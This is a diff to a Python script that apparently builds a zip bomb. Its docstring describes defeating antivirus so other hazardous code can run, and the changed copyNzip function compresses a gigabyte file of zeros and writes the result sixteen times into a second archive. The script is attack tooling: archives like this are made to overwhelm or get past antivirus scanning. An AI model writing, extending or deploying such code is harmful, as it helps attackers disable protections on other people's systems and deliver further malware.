@@ -8,6 +8,9 @@ antivirus so other hazardous code can run. Most modern antivirus programs
 know how to treat these files now.
 
 
+
+THIS IS A ROUGH DRAFT. THE CODE WILL BE PRETTIER SOON. (Ex: Adding loops,
+looking for different methods, orginization, adding print statements for the console, etc.)
 '''
 
 ############################ Variables ######################################
@@ -54,7 +57,6 @@ def other():
 
 
 # If you want a file larger than a Gig this will write that many 0s
-''' test2 is the same as test1 right now???'''
 def GigFunction():
     count = 0
     for x in range(0,1024):
@@ -78,20 +80,67 @@ def GigFunction():
 ###############################################################################
 def copyNzip():
     # Creates a zip file
-    zf = zipfile.ZipFile("test.zip","w")
+    zf = zipfile.ZipFile("first.zip","w")
     # Without compress_type with file will not be smaller
     zf.write("run.txt",compress_type=zipfile.ZIP_DEFLATED)
     zf.close()
 
     os.remove("run.txt")
     
+    # Will edit soon
     
-    zf = zipfile.ZipFile("test2.zip","w")
+    zf = zipfile.ZipFile("second.zip","w")
+    zf.write("first.zip",compress_type=zipfile.ZIP_DEFLATED)
+    os.rename("first.zip","first2.zip")
+    zf.write("first2.zip",compress_type=zipfile.ZIP_DEFLATED)
     
-    # Start the Loop
-    for x in range(0,1):
-        shutil.copyfile("test.zip", "test2.zip")
-        zf.close()
+    os.rename("first2.zip","first3.zip")
+    zf.write("first3.zip",compress_type=zipfile.ZIP_DEFLATED)
+    
+    os.rename("first3.zip","first4.zip")
+    zf.write("first4.zip",compress_type=zipfile.ZIP_DEFLATED)
+    
+    os.rename("first4.zip","first5.zip")
+    zf.write("first5.zip",compress_type=zipfile.ZIP_DEFLATED)
+    
+    os.rename("first5.zip","first6.zip")
+    zf.write("first6.zip",compress_type=zipfile.ZIP_DEFLATED)
+    
+    os.rename("first6.zip","first7.zip")
+    zf.write("first7.zip",compress_type=zipfile.ZIP_DEFLATED)
+    
+    os.rename("first7.zip","first8.zip")
+    zf.write("first8.zip",compress_type=zipfile.ZIP_DEFLATED)
+    
+    os.rename("first8.zip","first9.zip")
+    zf.write("first9.zip",compress_type=zipfile.ZIP_DEFLATED)
+
+    os.rename("first9.zip","first10.zip")
+    zf.write("first10.zip",compress_type=zipfile.ZIP_DEFLATED)
+
+    os.rename("first10.zip","first11.zip")
+    zf.write("first11.zip",compress_type=zipfile.ZIP_DEFLATED)
+
+    os.rename("first11.zip","first12.zip")
+    zf.write("first12.zip",compress_type=zipfile.ZIP_DEFLATED)
+
+    os.rename("first12.zip","first13.zip")
+    zf.write("first13.zip",compress_type=zipfile.ZIP_DEFLATED)
+
+    os.rename("first13.zip","first14.zip")
+    zf.write("first14.zip",compress_type=zipfile.ZIP_DEFLATED)
+
+    os.rename("first14.zip","first15.zip")
+    zf.write("first15.zip",compress_type=zipfile.ZIP_DEFLATED)
+
+    os.rename("first15.zip","first16.zip")
+    zf.write("first16.zip",compress_type=zipfile.ZIP_DEFLATED)
+
+    
+    zf.close() 
+    os.remove("first16.zip")
+
+    
     
 ###############################################################################
 
